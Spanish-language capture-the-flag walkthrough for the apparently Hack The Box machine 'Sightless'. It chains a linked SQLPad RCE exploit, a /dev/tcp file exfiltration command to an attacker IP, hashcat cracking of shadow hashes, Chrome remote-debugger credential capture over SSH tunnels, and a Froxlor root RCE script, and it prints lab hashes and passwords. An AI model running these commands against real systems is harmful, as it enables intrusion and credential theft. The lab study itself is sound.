Analizando al web hay un subdominio `sqlpad` y si analizamos las peticiones vesmos que hace peticiones a un direcotrio api y si nos metemos en alguno de los que hace peticiones vemos la version del servicio la cual es vulnerable con este codigo (https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)

dentro del equipo hay un archivo `sqlpad.sqlite` el cual nos lo vamos a transferir a nuestro equipo
- emisor
```bash
bash -c "cat sqlpad.sqlite > /dev/tcp/10.10.14.222/4443"
```
- receptor
```bash
nc -nlvp 4443 > sqlpad.sqlite
```

lo investigamos
![[{F222BC67-BB7A-4073-9031-906C446A5104}.png]]
da9a25f7-588c-40f5-89db-58fbebab591f|admin@sightless.htb|admin||$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC||||2024-05-15 04:48:09.377 +00:00|2024-05-15 18:16:54.652 +00:00|0||
26113beb-60eb-4a58-81eb-2318e27eb3bf|john@sightless.htb|editor|||2d3499e3-16ba-4b4b-a49e-c7c5dca89f2d|||2024-05-15 12:29:23.725 +00:00|2024-05-15 12:29:27.257 +00:00||0|

**Usuarios**
>admin - admin@sightless.htb - bcrypt - `$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC`
>editor - john@singhtless.htb

pero no podemos hacer nada con eso (la fuerza bruta no es una opcion), vamos ver mas cosas
![[Pasted image 20241025204823.png]]
tenemos dos usuarios en el sistema vamos ver el shadow ya que somos root,
![[{F37B5D9F-01A7-4E4F-B595-A3A323C77670}.png]]
crakeamos con 
```bash
hashcat -m 1800 -a 0 michael_hash /usr/share/wordlists/rockyou.txt -o michael_password
```

Creds: michael/insaneclownposse
creds: root/blindside

Esto es interesante
![[{287A1B64-D370-4776-A8ED-04ABEAC9F720}.png]]

![[{CBC5D845-4C55-456E-8A0B-777E3C61626A}.png]]
aqui vermos monturas `/var/lib/docker/overlay2/l/`
capabilities
![[{2206EC73-343B-4410-B54C-6D166F7C953A}.png]]
mas monturas
![[{0846F63C-0708-4EDA-BEFA-6C8F7DE9A40B}.png]]
posibles vulns 
![[{5445A437-BC5F-4471-9A7A-9B32ACEE8BA9}.png]]
vamos a iniciar un ssh con el usuario michael 
![[{7C5879B7-7A1A-4B61-8EFC-0E72A8FF8A41}.png]]

archivos
/usr/bin/networkd-dispatcher
/home/john/automation/healthcheck.sh
/home/john/automation/administration.py
/etc/laurel/config.toml


---
mirando los puetos en escucha de la maquina vamos a hacernos un portfowarding de la 8080 con `ssh -L 8081:127.0.0.1:8080 michael@<IP>` y vemos una web
![[Pasted image 20241025230517.png]]
![[{24141DDA-A499-4802-B672-BC7DC217C9F3}.png]]
investigando debemos hacer uso de este metodo (https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) para poder encontrar una conexion que se genera para ello tenemos que encontrar el puerto donde esta corriendo, por lo que tenemos que advinarlo, vamos a ir haciendo un port fowaring de cada uno de los puertos y vamos a ir agregandolos al navegador, de esta forma
```bash
ssh -L 8081:127.0.0.1:8080  -L 42899:127.0.0.1:42899 -L 33060:127.0.0.1:33060 -L 43927:127.0.0.1:43927 -L 43571:127.0.0.1:43571 michael@10.10.11.32
```
una vez puesto todos los puertos ahora vamos a agregarlos a nuestro navegador
> [!tip] Metodos
> - Google Chrome: `Chrome://inspect/#devices`
> - Firefox: `about:debugging#/setup`

```
127.0.0.1:3000
127.0.0.1:33060
127.0.0.1:55801
127.0.0.1:41669
127.0.0.1:42553
```


y los agregamos
![[Pasted image 20241026001825.png]]
y vemos que nos ha saalido esto si ahora clic en inspect y revisamos la network veremos las claves de inicio

![[Pasted image 20241026002334.png]]
vamos a iniciar con esos credenciales
```
admin/ForlorfroxAdmin
```

y la version es vulnerable por lo que podemos usar este script [Link](https://raw.githubusercontent.com/sarperavci/Froxlor-Authenticated-root-RCE-Exploit/refs/heads/main/exploit.py) o tambien: ![[Pasted image 20241026012408.png]]
ahora lo deshabilitamos y habilitamos y ya esta
![[Pasted image 20241026012655.png]]

![[{0528BD97-2D6C-4651-A0EA-8B708A0DF27C}.png]]
ahora le damos permisos y listo
ff5229400a1770ae6e37f0733b25fb77